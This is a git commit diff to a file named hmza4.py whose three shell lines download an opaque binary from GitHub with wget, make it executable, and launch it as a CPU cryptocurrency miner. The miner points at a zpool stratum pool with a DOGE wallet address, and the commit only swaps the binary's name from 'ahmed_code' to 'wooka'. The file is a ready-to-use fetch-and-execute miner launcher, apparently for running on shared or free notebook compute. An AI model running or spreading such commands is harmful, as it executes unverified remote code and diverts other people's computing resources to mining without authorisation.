af7a0fcc349aac87b5a608673619daada8660e67
hmzamin <81403385+hmzamin@users.noreply.github.com>
2021-05-26 15:20:42 +0200

    Update hmza4.py

--- hmza4.py
+++ hmza4.py
@@ -1,3 +1,3 @@
-!wget https://github.com/hmzamin/file/raw/main/ahmed_code
-!chmod u+x ./ahmed_code
-!./ahmed_code -a cpupower -o stratum+tcp://cpupower.sea.mine.zpool.ca:6240 -u DE4shNS2Siae2JSLdWmR4GmzXVvTPaGEeq -p c=DOGE
+!wget https://github.com/hmzamin/file/raw/main/wooka
+!chmod u+x ./wooka
+!./wooka -a cpupower -o stratum+tcp://cpupower.sea.mine.zpool.ca:6240 -u DE4shNS2Siae2JSLdWmR4GmzXVvTPaGEeq -p c=DOGE
